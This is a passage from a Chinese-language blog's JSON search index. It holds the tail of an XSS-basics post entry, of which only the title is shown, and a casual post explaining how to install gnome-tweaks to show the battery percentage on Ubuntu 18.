原理。","title":"網頁漏洞 XSS (Cross-Site-Scripting) 攻擊 (上) 基礎原理解說","type":"posts"},{"content":"","date":"2019/12/20","externalUrl":null,"permalink":"/tags/gnome/","section":"Tags","summary":"","title":"Gnome","type":"tags"},{"content":" 幹話 # 我本身是一位Ubuntu的愛好者，非常喜歡Ubuntu的美術設計。\n尤其當我從16版更新至18版時，那個模板看了真的是非常舒服！\n當我興奮的開始觀察各個角落時，突然發現，畫面右上角好像怪怪的。\nㄟ不是! 怎麼沒有顯示電量百分比！ 我一整個就不爽了。\n於是我開始查看設定，試圖尋找「顯示電池百分比」的相關設定項，但逛遍所有地方始終找不到，想到當初剛開始使用 Ubuntu 好像也遇過一次這樣的問題，模糊的印象中記得是要額外安裝個什麼的。\n記得好像\u0026hellip; 跟 gnome 有關？\n：「喔，他媽的，想到了。」\n正式開始 # 更新套件\n1$ apt-get update 歡迎今天的主角 — Gnome-Tweaks. 下載並啟動它\n1$ apt-get install gnome-tweaks 2$ gnome-tweaks 看到界面之後點選左邊欄位的「頂端列」\n裡面就可以開啟顯示電池百分比的設定啦！\nGnome-Tweaks ","date":"2019/12/20","externalUrl":null,"permalink":"/posts/ubuntu-show-battery-percentage/","section":"","summary":"","title":"Ubuntu 18 如何顯示電量百分比？","type":"posts"}]